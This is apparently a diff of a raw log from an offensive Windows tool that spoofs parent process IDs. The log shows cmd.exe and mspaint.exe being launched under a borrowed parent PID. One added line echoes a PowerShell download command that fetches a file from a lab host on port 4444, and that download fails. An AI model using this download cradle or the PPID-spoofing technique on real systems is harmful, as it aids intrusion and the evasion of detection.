@@ -803,4 +803,22 @@ conhost.exe                   3088 Console                    1      7,516 K
 tasklist.exe                  5416 Console                    1      7,840 K
 ++++++++++++++++++ [+] Got Handle for ppid: 556
 [+] Updated proc attribute list
-[+] Starting C:\Windows\System32\cmd.exe...True - pid: 1496 - Last error: 87 
+[+] Starting C:\Windows\System32\cmd.exe...True - pid: 1496 - Last error: 87 Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved. Exception calling "DownloadFile" with "2" argument(s): "The remote server returned an error: (404) Not Found."
+At line:1 char:1
++ (New-Object Net.WebClient).DownloadFile('http://192.168.116.129:4444/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+The argument 'c:/users/alsadeq/test.ps1' to the -File parameter does not exist. Provide the path to an existing '.ps1' file as an argument to the -File parameter.[+] Got Handle for ppid: 556
+[+] Updated proc attribute list
+[+] Starting C:\Windows\System32\cmd.exe...True - pid: 6544 - Last error: 87 [+] Got Handle for ppid: 556
+[+] Updated proc attribute list
+[+] Starting C:\Windows\System32\mspaint.exe...True - pid: 4760 - Last error: 0 [+] Got Handle for ppid: 556
+[+] Updated proc attribute list
+[+] Starting C:\Windows\System32\cmd.exe...True - pid: 6256 - Last error: 87 [+] Got Handle for ppid: 556
+[+] Updated proc attribute list
+[+] Starting C:\Windows\System32\cmd.exe...True - pid: 6876 - Last error: 87 [+] Got Handle for ppid: 556
+[+] Updated proc attribute list
+[+] Starting C:\Windows\System32\cmd.exe...True - pid: 6764 - Last error: 87 
